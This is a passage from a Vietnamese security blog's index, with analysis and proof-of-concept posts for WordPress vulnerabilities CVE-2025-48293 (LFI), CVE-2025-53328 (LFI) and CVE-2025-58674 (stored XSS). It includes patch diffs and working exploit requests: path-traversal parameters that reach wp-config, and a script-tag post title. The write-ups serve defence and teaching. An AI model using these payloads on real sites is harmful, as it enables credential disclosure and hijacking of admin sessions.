","date":"2025-10-13","objectID":"/vi/posts/2025-10-13-cve-2025-48293/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/vi/posts/2025-10-13-cve-2025-48293/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"Vulnerable Code\rTa phân tích logic trong GeoMashup::locate_template() có ảnh hưởng gì đến $template_base public static function locate_template( $template_base ) { $template = locate_template( array(\"geo-mashup-$template_base.php\") ); if ( empty( $template ) || !is_readable( $template ) ) { $template = path_join( GEO_MASHUP_DIR_PATH, \"default-templates/$template_base.php\" ); } return $template; } $template được gán lại giá trị bằng cách gọi locate_template() thuộc file template.php với đối số geo-mashup-$template_base.php function locate_template( $template_names, $load = false, $load_once = true, $args = array() ) { global $wp_stylesheet_path, $wp_template_path; if ( ! isset( $wp_stylesheet_path ) || ! isset( $wp_template_path ) ) { wp_set_template_globals(); } $is_child_theme = is_child_theme(); $located = ''; foreach ( (array) $template_names as $template_name ) { if ( ! $template_name ) { continue; } if ( file_exists( $wp_stylesheet_path . '/' . $template_name ) ) { $located = $wp_stylesheet_path . '/' . $template_name; break; } elseif ( $is_child_theme \u0026\u0026 file_exists( $wp_template_path . '/' . $template_name ) ) { $located = $wp_template_path . '/' . $template_name; break; } elseif ( file_exists( ABSPATH . WPINC . '/theme-compat/' . $template_name ) ) { $located = ABSPATH . WPINC . '/theme-compat/' . $template_name; break; } } if ( $load \u0026\u0026 '' !== $located ) { load_template( $located, $load_once, $args ); } return $located; } Các logic liên quan đến sự tồn tại của file khi concat với $template_name được xử lý, nếu không tồn tại thì trả về chuỗi rỗng '' Các logic liên quan đến sự tồn tại của file Khi attack gửi $_GET['template'] chứa ../ thì mặc định file luôn không tồn tại, luôn trả về '' Quay trở lại GeoMashup::locate_template(), khi $template_name empty và không tồn tại (!is_readable($template)) thì được gán lại giá trị và trả về. const string GEO_MASHUP_DIR_PATH = \"/srv/www/wordpress/wp-content/plugins/geo-mashup\" GEO_MASHUP_DIR_PATH.default-templates/$template_base.php 👉 GeoMashup::locate_template() không ảnh hưởng đến $template_base do ta kiểm soát, ta tiến hành tìm cách kích hoạt sự kiện này if ( ( isset( $_GET['output'] ) and 'json' == $_GET['output'] ) or empty( $_GET['object_ids'] ) ) { GeoMashupQuery::generate_location_json( ); } else { GeoMashupQuery::generate_object_html( ); } generate_object_html() chỉ được gọi khi $_GET['output'] không được truyền và $_GET['object_ids'] không empty. geo-query.php chứa logic trên được gọi trong geo-mashup.php geo-query.php được gọi trong geo-mashup.php Hàm geo_query là callback của action hook Unauthenticated add_action( 'wp_ajax_nopriv_geo_mashup_query', array( __CLASS__, 'geo_query') ); Khi truy cập endpoint /wp-admin/admin-ajax.php với param action=geo_mashup_query thì callback geo_query được gọi. ","date":"2025-10-13","objectID":"/vi/posts/2025-10-13-cve-2025-48293/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/vi/posts/2025-10-13-cve-2025-48293/#vulnerable-code"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-10-13","objectID":"/vi/posts/2025-10-13-cve-2025-48293/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/vi/posts/2025-10-13-cve-2025-48293/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rThêm code vào wp-config.php để thử nghiệm echo \"Payload\"; Gửi GET request với LFI payload GET /wp-admin/admin-ajax.php?action=geo_mashup_query\u0026object_ids=2\u0026template=../../../../wp-config HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: vi,en-US;q=0.7,en;q=0.3 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 X-PwnFox-Color: green Priority: u=0, i Result: Kết quả LFI thành công ","date":"2025-10-13","objectID":"/vi/posts/2025-10-13-cve-2025-48293/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/vi/posts/2025-10-13-cve-2025-48293/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rCVE-2025-48293 là LFI do dùng input template không kiểm soát khi ghép vào đường dẫn fallback, cho phép path traversal (..) và include file ngoài dự định. Đã vá trong v1.13.17 bằng sanitize_key(). ","date":"2025-10-13","objectID":"/vi/posts/2025-10-13-cve-2025-48293/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/vi/posts/2025-10-13-cve-2025-48293/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"Key takeaways\rKhông dùng input user trực tiếp để build path cho include. Dùng whitelist hoặc sanitize_key() + realpath() kiểm tra. ","date":"2025-10-13","objectID":"/vi/posts/2025-10-13-cve-2025-48293/:6:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/vi/posts/2025-10-13-cve-2025-48293/#key-takeaways"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rFile Inclusion/Path traversal — Hacktrick WordPress Geo Mashup Plugin \u003c= 1.13.16 is vulnerable to Local File Inclusion ","date":"2025-10-13","objectID":"/vi/posts/2025-10-13-cve-2025-48293/:7:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/vi/posts/2025-10-13-cve-2025-48293/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Poll, Survey \u0026 Quiz Maker Plugin by Opinion Stage Plugin.","date":"2025-10-12","objectID":"/vi/posts/2025-10-12-cve-2025-53328/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/vi/posts/2025-10-12-cve-2025-53328/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin Poll, Survey \u0026 Quiz Maker Plugin by Opinion Stage phiên bản ≤ 19.11.0 chứa lỗ hổng Local File Inclusion (CVE-2025-53328, CVSS 7.5) cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh include/require, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã. CVE ID: CVE-2025-53328 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 19.11.0 Patched Versions: 19.11.1 CVSS severity: High (7.5) Required Privilege: Unauthenticated Product: WordPress Poll, Survey \u0026 Quiz Maker Plugin by Opinion Stage Plugin Quan trọng Mặc dù lỗ hổng được công bố là Unauthenticated, trong thực tế việc khai thác đòi hỏi kẻ tấn công có quyền nội bộ tối thiểu — ví dụ tài khoản Contributor hoặc quyền tương đương trên WordPress ","date":"2025-10-12","objectID":"/vi/posts/2025-10-12-cve-2025-53328/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/vi/posts/2025-10-12-cve-2025-53328/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Poll, Survey \u0026 Quiz Maker Plugin by Opinion Stage: 19.11.0 (vulnerable) và 19.11.1 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. ","date":"2025-10-12","objectID":"/vi/posts/2025-10-12-cve-2025-53328/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/vi/posts/2025-10-12-cve-2025-53328/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\r","date":"2025-10-12","objectID":"/vi/posts/2025-10-12-cve-2025-53328/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/vi/posts/2025-10-12-cve-2025-53328/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch diff\rBản lỗi: private static function prepare_view_file_name_form_current_page() { $view_file_name = ''; if ( !empty( $_REQUEST['page'] ) ) { $qry_str_check_os = sanitize_text_field( $_REQUEST['page'] ); $qry_str_check_os = explode( '-', $qry_str_check_os ); if ( 'opinionstage' === $qry_str_check_os[0] ) { $view_file_name = str_replace( 'opinionstage-', '', sanitize_text_field( $_REQUEST['page'] ) ); $view_file_name = str_replace( '-', '_', $view_file_name ); } } return $view_file_name; } Trong phiên bản vulnerable, page param được lấy từ $_REQUEST do người dùng kiểm soát nhưng không xác minh hợp lệ của tên file =\u003e Cho phép Local File Inclusion. Trong hàm này chỉ có các logic loại bỏ các ký tự HTML bằng sanitize_text_field và kiểm tra tiền tố opinionstage- sau đó loại bỏ tiền tố và thay - bằng _ nên attacker có thể truyền: ?page=opinionstage-../../wp-config Bản vá: private static function prepare_view_file_name_from_current_page() { if (empty($_REQUEST['page']) || !is_string($_REQUEST['page'])) { return ''; } $page = sanitize_text_field($_REQUEST['page']); if (substr($page, 0, strlen('opinionstage-')) !== 'opinionstage-') { return ''; } $template_name = substr($page, strlen('opinionstage-')); $template_name = str_replace('-', '_', $template_name); if (!in_array($template_name, self::$allowed_templates, true)) { return ''; } if (strpos($template_name, '..') !== false || strpos($template_name, '/') !== false || strpos($template_name, '\\\\') !== false) { return ''; } return $template_name; } Bản vá đã bổ sung nhiều lớp bảo vệ như kiểm tra kiểu dữ liệu, xác minh prefix \"opinionstage-\", áp dụng whitelist (self::$allowed_templates), ngăn traversal ký tự nguy hiểm ","date":"2025-10-12","objectID":"/vi/posts/2025-10-12-cve-2025-53328/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/vi/posts/2025-10-12-cve-2025-53328/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"Vulnerable Code\rHàm prepare_view_file_name_form_current_page() được gọi từ load_template() public static function load_template() { $view_file_name = self::prepare_view_file_name_form_current_page(); if ( !$view_file_name ) { return; } $os_client_logged_in = Helper::is_user_logged_in(); $os_options = Helper::get_opinionstage_option(); TemplatesViewer::require_template( 'admin/views/' . $view_file_name, compact( 'os_client_logged_in', 'os_options' ) ); } require_template() được gọi với đối số 'admin/views/'.$view_file_name public static function require_template($template_name, $args = []) { $path = Opinionstage::get_instance()-\u003eplugin_path . $template_name . '.php'; if( ! file_exists( $path ) ) { return; } extract($args); require( $path ); } require() hàm chính gây LFI được gọi với đối số $path là giá trị concat từ đường dẫn của plugin (plugin_path), $template_name, .php public function register_menu_page() { if ( function_exists( 'add_menu_page' ) ) { $os_client_logged_in = Helper::is_user_logged_in(); if ( $os_client_logged_in ) { add_menu_page( __( 'Opinion Stage', 'social-polls-by-opinionstage' ), __( 'Opinion Stage', 'social-polls-by-opinionstage' ), 'edit_posts', OPINIONSTAGE_MENU_SLUG, [ __CLASS__, 'load_template' ], Opinionstage::get_instance()-\u003eplugin_url . 'admin/images/os-icon.svg', '25.234323221' ); add_submenu_page( OPINIONSTAGE_MENU_SLUG, 'View My Items', 'My Items', 'edit_posts', OPINIONSTAGE_MENU_SLUG ); add_submenu_page( OPINIONSTAGE_MENU_SLUG, 'Tutorials \u0026 Help', 'Tutorials \u0026 Help', 'edit_posts', OPINIONSTAGE_HELP_RESOURCE_SLUG, [ $this, 'load_template' ] ); } else { add_menu_page( __( 'Opinion Stage', 'social-polls-by-opinionstage' ), __( 'Opinion Stage', 'social-polls-by-opinionstage' ), 'edit_posts', OPINIONSTAGE_GETTING_STARTED_SLUG, [ __CLASS__, 'load_template' ], Opinionstage::get_instance()-\u003eplugin_url . 'admin/images/os-icon.svg', '25.234323221' ); add_submenu_page( OPINIONSTAGE_GETTING_STARTED_SLUG, 'Get Started', 'Get Started', 'edit_posts', OPINIONSTAGE_GETTING_STARTED_SLUG, [ $this, 'load_template' ] ); } } } register_menu_page() sẽ register 2 submenu với load_template làm callback dựa trên trạng thái đăng nhập của người dùng Để truy cập vào submenu của admin người dùng cần phải login vào WordPress với đặc quyền tối thiểu là Contributor =\u003e đặc quyền yêu cầu của CVE này là Contributor 2 slug được khai báo cho 2 submenu: const string OPINIONSTAGE_MENU_SLUG = \"opinionstage-settings\" const string OPINIONSTAGE_GETTING_STARTED_SLUG = \"opinionstage-getting-started\" ","date":"2025-10-12","objectID":"/vi/posts/2025-10-12-cve-2025-53328/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/vi/posts/2025-10-12-cve-2025-53328/#vulnerable-code"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-10-12","objectID":"/vi/posts/2025-10-12-cve-2025-53328/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/vi/posts/2025-10-12-cve-2025-53328/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rLogin bằng tài khoản Contributor Gửi POST request: POST /wp-admin/admin.php?page=opinionstage-getting-started HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: vi,en-US;q=0.7,en;q=0.3 Accept-Encoding: gzip, deflate, br Referer: http://localhost/wp-admin/ Connection: keep-alive Cookie: wordpress_86a9106ae65537651a8e456835b316ab=con%7C1760451626%7CeIWnBlZSv8mq15W1MfZbUd1WqiPvrNbuhzcGwDNgRtf%7C95a2ae30f463a8c1d010a70313f3f305e2c6e99b18056b7827132b809329c400; wp-settings-time-3=1760279584; intercom-id-y45xtsgw=f5cf9200-6f02-4b61-bb0a-94ef864e710e; intercom-session-y45xtsgw=; intercom-device-id-y45xtsgw=40def9f9-8e76-4d64-9bbc-28c12b70544f; wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=con%7C1760451626%7CeIWnBlZSv8mq15W1MfZbUd1WqiPvrNbuhzcGwDNgRtf%7C2f86a0974e1c1d7b5ef8322a588e50ef5879561d1fc2f84b7c6eddf5c98ffcce Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin X-PwnFox-Color: green Priority: u=0, i Content-Type: application/x-www-form-urlencoded Content-Length: 28 page=opinionstage-../payload Debugging: Debug - Giá trị của $view_file_name Debug - Giá trị của $path được require File payload.php được tạo để thử nghiệm \u003c?php echo \"ABC\"; Result Kết quả LFI thành công ","date":"2025-10-12","objectID":"/vi/posts/2025-10-12-cve-2025-53328/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/vi/posts/2025-10-12-cve-2025-53328/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Explain\rTa tận dụng cách WordPress và Plugin xử lý tham số: WordPress xác định trang quản trị dựa trên page trong URL, nhưng plugin lại đọc page từ $_REQUEST - mà $_REQUEST sẽ ưu tiên giá trị từ body khi request là POST. Vì vậy ta gửi một POST tới admin.php?page=opinionstage-getting-started (page hợp lệ trên URL để gọi callback), đồng thời đặt page=opinionstage-../payload trong body của POST. Kết quả: WordPress chấp nhận URL và gọi callback, còn plugin lấy page từ $_REQUEST (body) chứa payload ../ — cho phép vượt thư mục và khai thác LFI. ","date":"2025-10-12","objectID":"/vi/posts/2025-10-12-cve-2025-53328/:4:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/vi/posts/2025-10-12-cve-2025-53328/#explain"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rCVE-2025-53328 là LFI do dùng input page không được kiểm soát để tạo đường dẫn file cho require() - tiền tố opinionstage- được chấp nhận nhưng phần sau có thể chứa .. / \\ để vượt thư mục. Bản vá (v19.11.1) thêm kiểm tra kiểu, chặn traversal và whitelist template. ","date":"2025-10-12","objectID":"/vi/posts/2025-10-12-cve-2025-53328/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/vi/posts/2025-10-12-cve-2025-53328/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"Key takeaways\rKhông dùng input user trực tiếp để xây path cho include/require. Áp dụng whitelist (hoặc mapping) cho tên template. Chặn .., /, \\ hoặc dùng realpath() so với thư mục gốc. Cập nhật plugin lên 19.11.1 ngay. ","date":"2025-10-12","objectID":"/vi/posts/2025-10-12-cve-2025-53328/:6:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/vi/posts/2025-10-12-cve-2025-53328/#key-takeaways"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rFile Inclusion/Path traversal — Hacktrick WordPress Poll, Survey \u0026 Quiz Maker Plugin by Opinion Stage Plugin \u003c= 19.11.0 is vulnerable to Local File Inclusion ","date":"2025-10-12","objectID":"/vi/posts/2025-10-12-cve-2025-53328/:7:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/vi/posts/2025-10-12-cve-2025-53328/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Core.","date":"2025-10-11","objectID":"/vi/posts/2025-10-11-cve-2025-58674/","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/vi/posts/2025-10-11-cve-2025-58674/"},{"categories":["CVE Analyst"],"collections":null,"content":"Lỗ hổng Stored Cross Site Scripting(XSS) xảy ra trên WordPress Core trước phiên bản 6.8.3. Nguyên nhân do sai xử lý đầu vào khi sinh trang web động, tác động đến chức năng tạo menu (nav menus) CVE ID: CVE-2025-58674 Vulnerability Type: Cross Site Scripting (XSS) Affected Versions: \u003c= 6.8.2 Patched Versions: 6.8.3 CVSS severity: Low (5.9) Required Privilege: Author Product: WordPressCore ","date":"2025-10-11","objectID":"/vi/posts/2025-10-11-cve-2025-58674/:0:0","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/vi/posts/2025-10-11-cve-2025-58674/#"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Wordpress Core Versions: v6.8.2 (vulnerable) và v6.8.3 (patched). Diff Tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. Theme - Astra: Theme rất phổ biến với người dùng WordPress, hỗ trợ tạo nav memu nhanh chóng. ","date":"2025-10-11","objectID":"/vi/posts/2025-10-11-cve-2025-58674/:1:0","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/vi/posts/2025-10-11-cve-2025-58674/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\rWordPress là phần mềm mã nguồn mở, có kho lưu trữ nằm ở github nên ta có thể tìm đến commit liên quan đến sự kiện vá lỗ hổng XSS để quan sát sự thay đổi, hiểu được lỗ hổng xảy ra ở đâu. ","date":"2025-10-11","objectID":"/vi/posts/2025-10-11-cve-2025-58674/:2:0","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/vi/posts/2025-10-11-cve-2025-58674/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch diff\rBản lỗi: updateParentDropdown : function() { return this.each(function(){ var menuItems = $( '#menu-to-edit li' ), parentDropdowns = $( '.edit-menu-item-parent' ); $.each( parentDropdowns, function() { var parentDropdown = $( this ), $html = '', $selected = '', currentItemID = parentDropdown.closest( 'li.menu-item' ).find( '.menu-item-data-db-id' ).val(), currentparentID = parentDropdown.closest( 'li.menu-item' ).find( '.menu-item-data-parent-id' ).val(), currentItem = parentDropdown.closest( 'li.menu-item' ), currentMenuItemChild = currentItem.childMenuItems(), excludeMenuItem = [ currentItemID ]; if ( currentMenuItemChild.length \u003e 0 ) { $.each( currentMenuItemChild, function(){ var childItem = $(this), childID = childItem.find( '.menu-item-data-db-id' ).val(); excludeMenuItem.push( childID ); }); } if ( currentparentID == 0 ) { $selected = 'selected'; } $html += '\u003coption ' + $selected + ' value=\"0\"\u003e' + wp.i18n._x( 'No Parent', 'menu item without a parent in navigation menu' ) + '\u003c/option\u003e'; $.each( menuItems, function() { var menuItem = $(this), $selected = '', menuID = menuItem.find( '.menu-item-data-db-id' ).val(), menuTitle = menuItem.find( '.edit-menu-item-title' ).val(); if ( ! excludeMenuItem.includes( menuID ) ) { if ( currentparentID == menuID ) { $selected = 'selected'; } $html += '\u003coption ' + $selected + ' value=\"' + menuID + '\"\u003e' + menuTitle + '\u003c/option\u003e'; } }); parentDropdown.html( $html ); }); }); }, Trong phiên bản lỗi, giá trị menuTitle được chèn vào thẻ \u003coption\u003e và được hiển thị ra HTML bằng phương thức html() của jQuery mà không có bất kỳ cơ chế ngăn chặn XSS nào. Hàm html() dùng để thay thế nội dung HTML bên trong phần tử hiện tại, nên nếu menuTitle chứa mã độc thì mã đó sẽ được thực thi trên trình duyệt. Bản vá: updateParentDropdown : function() { return this.each(function(){ var menuItems = $( '#menu-to-edit li' ), parentDropdowns = $( '.edit-menu-item-parent' ); $.each( parentDropdowns, function() { var parentDropdown = $( this ), currentItemID = parseInt( parentDropdown.closest( 'li.menu-item' ).find( '.menu-item-data-db-id' ).val() ), currentParentID = parseInt( parentDropdown.closest( 'li.menu-item' ).find( '.menu-item-data-parent-id' ).val() ), currentItem = parentDropdown.closest( 'li.menu-item' ), currentMenuItemChild = currentItem.childMenuItems(), excludeMenuItem = /** @type {number[]} */ [ currentItemID ]; parentDropdown.empty(); if ( currentMenuItemChild.length \u003e 0 ) { $.each( currentMenuItemChild, function(){ var childItem = $(this), childID = parseInt( childItem.find( '.menu-item-data-db-id' ).val() ); excludeMenuItem.push( childID ); }); } parentDropdown.append( $( '\u003coption\u003e', { value: '0', selected: currentParentID === 0, text: wp.i18n._x( 'No Parent', 'menu item without a parent in navigation menu' ), } ) ); $.each( menuItems, function() { var menuItem = $(this), menuID = parseInt( menuItem.find( '.menu-item-data-db-id' ).val() ), menuTitle = menuItem.find( '.edit-menu-item-title' ).val(); if ( ! excludeMenuItem.includes( menuID ) ) { parentDropdown.append( $( '\u003coption\u003e', { value: menuID.toString(), selected: currentParentID === menuID, text: menuTitle, } ) ); } }); }); }); }, Bản vá đã khắc phục lỗ hổng bằng cách chỉ định rõ menuTitle được gán vào thuộc tính text thay vì nội dung HTML. Điều này đảm bảo giá trị của menuTitle được xử lý như văn bản thuần túy, không thể chứa hoặc thực thi mã JavaScript độc hại. Nhờ đó, dữ liệu được thêm vào thẻ \u003coption\u003e hoàn toàn an toàn và loại bỏ khả năng tấn công XSS thông qua giá trị menuTitle. So sánh sự khác biệt giữa bản lỗi và bản vá ","date":"2025-10-11","objectID":"/vi/posts/2025-10-11-cve-2025-58674/:2:1","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/vi/posts/2025-10-11-cve-2025-58674/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"Vulnerable code\rInpsect code trên trình duyệt ta thấy menuItems = #menu-to-edit li là mảng các thẻ \u003cli\u003e thuộc thẻ \u003cul\u003e có id=menu-to-edit Inspect code trên trình duyệt Hàm updateParentDropdown sẽ duyệt các thẻ \u003cli\u003e lấy value của \u003cinput\u003e có class edit-menu-item-title, gán giá trị đó cho menuTitle trong thẻ \u003coption\u003e và hiển thị ra HTML. Inspect DOM sau khi thêm menu Trên UI: Hình ảnh hiển thị trên giao diện quản trị Trong commit có một sửa đổi tưởng chừng là hữu ích, nhưng chả có ích cho quá trình phân tích. HTML entity encode (1) Tôi đã sử dụng // để comment tất cả các dòng liên quan đến html_entity_decode của origin_title nhưng vẫn khai thác được. Trước đó tôi đã đặt debug đến các vị trí này nhưng không có gì xảy ra. Ngoài việc sử dụng comment, tôi đã chọn menu chứa XSS payload và click Add to Menu, bắt request bằng BurpSuite để xem giá trị được add có được html entity encode không. HTML entity encode (2) menu-item-title là giá trị lấy thẻ input có name menu-item[-5][menu-item-title] từ post-title được check để thêm vào body của request \u003cinput type=\"hidden\" class=\"menu-item-title\" name=\"menu-item[-5][menu-item-title]\" value=\"\u003cscript\u003ealert(document.domain)\u003c/script\u003e\"\u003e Có 1 điều thú vị ở đây, trình duyệt lấy giá trị đã decode html entity để thêm vào request, biết giá trị từ server trước khi echo ra HTML đã được encode Trình duyệt decode HTML entity trước khi gửi 👉 Browser đã decode html entity trước khi hiển thị ra HTML. Trên DOM, sau khi click Add to Menu =\u003e attachTabsPanelListeners được gọi và thêm giá trị vừa selected vào bottom của menu item. Thêm item vào cuối danh sách menu 👉 edit-menu-item-title có giá trị chứa XSS payload. Hàm updateParentDropdown sẽ lấy nó gán cho thẻ \u003coption\u003e =\u003e XSS xảy ra ","date":"2025-10-11","objectID":"/vi/posts/2025-10-11-cve-2025-58674/:2:2","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/vi/posts/2025-10-11-cve-2025-58674/#vulnerable-code"},{"categories":["CVE Analyst"],"collections":null,"content":"Sources \u0026 Sinks\rSource: post-title tiêu đề của post Sink: parentDropdown.html( $html ) có thể chứa HTML độc hại $html += '\u003coption ' + $selected + ' value=\"' + menuID + '\"\u003e' + menuTitle + '\u003c/option\u003e'; ","date":"2025-10-11","objectID":"/vi/posts/2025-10-11-cve-2025-58674/:2:3","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/vi/posts/2025-10-11-cve-2025-58674/#sources--sinks"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-10-11","objectID":"/vi/posts/2025-10-11-cve-2025-58674/:3:0","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/vi/posts/2025-10-11-cve-2025-58674/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rSử dụng tài khoản author, tạo post có title chứa XSS payload Admin truy cập endpoint wp-admin/nav-menus.php và thực hiện add menus từ post vừa tạo Sự kiện Javascript được kích hoạt Proof of Concept: XSS Thẻ \u003cscript\u003e nằm trong \u003coption\u003e thuộc \u003cselect\u003e có thể thực thi được nhưng các thẻ khác thì không, chỉ trả về text chứa trong đó. {: .prompt-info } Khi browser parse chuỗi HTML, \u003cscript\u003e không nằm trong flow \u003coption\u003e thực sự mà parser “nhấc” script ra khỏi \u003coption\u003e và đưa vào DOM tree. \u003cselect name=\"\" id=\"\"\u003e \u003coption value=\"\"\u003eabc\u003c/option\u003e \u003coption value=\"\"\u003e\u003cscript\u003ealert(1)\u003c/script\u003e\u003c/option\u003e \u003c/select\u003e Vì thế, script thực thi ngay, còn \u003coption\u003e vẫn tồn tại, nhưng nội dung \u003coption\u003e trống hoặc hiển thị text rỗng. Inspect DOM sau khi script được tách Đối với các thẻ khác \u003cselect name=\"\" id=\"\"\u003e \u003coption value=\"\"\u003eabc\u003c/option\u003e \u003coption value=\"\"\u003e\u003cb\u003eabd\u003c/b\u003e\u003c/option\u003e \u003c/select\u003e Browser tuân thủ spec: \u003coption\u003e chỉ chứa text-only. Khi parse \u003cb\u003e hoặc \u003cimg\u003e trong \u003coption\u003e: \u003cb\u003e bị coi là text =\u003e mất tag, chỉ hiển thị abd như text. \u003cimg\u003e bị loại bỏ hoàn toàn. Inspect: render option với thẻ inline ","date":"2025-10-11","objectID":"/vi/posts/2025-10-11-cve-2025-58674/:3:1","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/vi/posts/2025-10-11-cve-2025-58674/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rCVE-2025-58674 cho thấy rủi ro khi chèn dữ liệu người dùng trực tiếp vào HTML bằng html() hoặc innerHTML. \u003cscript\u003e trong \u003coption\u003e được parser tách ra và thực thi, trong khi các thẻ khác bị bỏ hoặc coi là text. Bản vá sử dụng thuộc tính text để đảm bảo an toàn, loại bỏ XSS. ","date":"2025-10-11","objectID":"/vi/posts/2025-10-11-cve-2025-58674/:4:0","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/vi/posts/2025-10-11-cve-2025-58674/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"Key takeaways\rKhông nối chuỗi HTML từ dữ liệu user rồi chèn bằng html()/innerHTML. Dùng API tạo element an toàn (option.text, document.createElement). Luôn escape/sanitize dữ liệu ở cả server và client. Hiểu hành vi parser: \u003cscript\u003e có thể thoát khỏi container inert. ","date":"2025-10-11","objectID":"/vi/posts/2025-10-11-cve-2025-58674/:5:0","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/vi/posts/2025-10-11-cve-2025-58674/#key-takeaways"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rCross-site scripting (XSS) cheat sheet — PortSwigger WordPress Core \u003c= 6.8.2 is vulnerable to Cross Site Scripting (XSS) ","date":"2025-10-11","objectID":"/vi/posts/2025-10-11-cve-2025-58674/:6:0","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/vi/posts/2025-10-11-cve-2025-58674/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress WooCommerce 